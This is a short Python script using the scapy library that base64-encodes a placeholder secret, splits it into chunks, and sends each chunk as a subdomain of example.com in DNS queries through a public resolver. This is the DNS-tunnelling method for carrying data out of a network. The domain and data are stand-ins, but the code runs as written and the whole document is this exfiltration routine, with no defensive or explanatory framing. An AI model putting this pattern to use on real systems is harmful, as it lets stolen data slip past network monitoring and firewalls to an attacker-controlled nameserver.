from base64 import b64encode
from scapy.all import IP, UDP, DNS, DNSQR, sr1, conf
conf.verb = 0
payload = b64encode(b'SOME SECRET DATA')
chunks = [payload[i:i+50] for i in range(0, len(payload), 50)]
for c in chunks:
    q = IP(dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=(c.decode()+'.example.com')))
    r = sr1(q, timeout=2)
    if r:
        print('answered')
        